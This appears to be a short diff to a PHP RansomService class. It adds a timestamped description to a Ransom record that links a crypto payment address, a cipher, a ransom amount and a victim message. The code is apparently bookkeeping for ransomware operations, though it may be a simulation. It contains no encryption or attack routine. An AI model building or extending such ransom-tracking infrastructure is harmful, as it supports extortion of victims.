@@ -40,6 +40,7 @@ class RansomService
         $encrypted = new Ransom($crypto_address, $cipher);
         $encrypted->set_ransom_amount(0.3);
         $encrypted->set_message("Sorry it happened to you!");
+        $encrypted->set_description("Automatically created ransom on " . date("Y-m-d H:i:s") . ".");
         $crypto_address->set_encrypted_computer($encrypted);
         $cipher->set_encrypted_computer($encrypted);
 
